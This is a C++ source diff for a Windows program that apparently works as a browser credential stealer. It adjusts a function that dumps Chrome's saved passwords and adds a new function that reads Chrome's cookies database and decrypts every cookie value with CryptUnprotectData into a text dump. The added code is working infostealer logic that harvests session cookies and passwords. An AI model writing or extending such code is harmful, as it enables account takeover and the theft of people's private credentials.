@@ -10,10 +10,9 @@ std::stringstream get_chrome_pass(sqlite3* db)
     rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
     if (rc != SQLITE_OK)
     {
-        std::cout << "statement failed rc = " << rc << std::endl;
-        return  std::stringstream();
+        dump << "statement failed rc = " << rc;
+        return dump;
     }
-    std::cout << std::endl;
 
     rc = sqlite3_step(pStmt);
     //std::cout << "RC: " << rc << std::endl;
@@ -43,11 +42,65 @@ std::stringstream get_chrome_pass(sqlite3* db)
             dump << *password;
             password++;
         }
-                
+
         dump << std::endl;
         free(encryptedPass.pbData);
         rc = sqlite3_step(pStmt);
     }
+    rc = sqlite3_finalize(pStmt);
+    sqlite3_close(db);
+    return dump;
+}
+
+std::stringstream get_chrome_cookies(sqlite3* db)
+{
+    std::string sql = "SELECT HOST_KEY, path, encrypted_value FROM cookies";
+
+    std::stringstream dump(std::string(""));
+    sqlite3_stmt *pStmt;
+    int rc;
+    rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
+    if (rc != SQLITE_OK)
+    {
+        dump << "statement failed rc = " << rc;
+        return dump;
+    }
+    std::cout << std::endl;
+
+    rc = sqlite3_step(pStmt);
+    //std::cout << "RC: " << rc << std::endl;
+    while (rc == SQLITE_ROW) 
+    {
+        dump << sqlite3_column_text(pStmt, 0) << " ";
+        dump << (char *)sqlite3_column_text(pStmt, 1) << " ";
+
+        DATA_BLOB encryptedCookies, decryptedCookies;
+
+        encryptedCookies.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
+        encryptedCookies.pbData = (byte *)malloc((int)encryptedCookies.cbData);
+
+        memcpy(encryptedCookies.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedCookies.cbData);
+
+        CryptUnprotectData(
+                &encryptedCookies,
+                NULL,
+                NULL,
+                NULL,
+                NULL,
+                0,
+                &decryptedCookies);
+        char *cookies = (char *)decryptedCookies.pbData;
+        while (isprint(*cookies))
+        {
+            dump << *cookies;
+            cookies++;
+        }
+
+        dump << std::endl;
+        free(encryptedCookies.pbData);
+        rc = sqlite3_step(pStmt);
+    }
+    
     rc = sqlite3_finalize(pStmt);
     sqlite3_close(db);
     return dump;
